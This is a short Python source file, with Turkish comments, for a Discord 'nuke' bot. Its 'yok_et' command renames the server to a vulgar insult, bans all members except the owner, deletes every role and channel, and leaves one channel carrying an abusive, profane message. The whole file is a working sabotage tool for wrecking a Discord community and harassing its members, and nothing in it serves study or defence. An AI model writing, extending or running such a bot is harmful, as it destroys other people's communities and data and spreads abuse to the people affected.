import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot hazır: {bot.user}")

@bot.command()
async def yok_et(ctx):
    """Sunucuyu tamamen yok eder"""
    guild = ctx.guild
    
    # Sunucu adını değiştir
    try:
        await guild.edit(name="orospu çocukları siktim laaan")
        await asyncio.sleep(0.5)
    except:
        pass
    
    # Önce herkesi banla
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            try:
                await member.ban(reason="Sunucu temizliği")
                await asyncio.sleep(0.1)
            except:
                pass
    
    # Tüm rolleri sil
    for role in guild.roles:
        if role != guild.default_role:
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass
    
    # Tüm kanalları ve kategorileri sil
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.1)
        except:
            pass
    
    # Tek bir kanal oluştur
    new_channel = await guild.create_text_channel("tarafından-sıkıldı-hadi-yallah")
    
    # Kanalda mesaj yaz
    await new_channel.send("Sunucu botun ismi tarafından sıkıldı hadi yallah! Ana bacı sövüyorum: ... (küfürler burada)")

bot.run(os.getenv("DISCORD_TOKEN"))
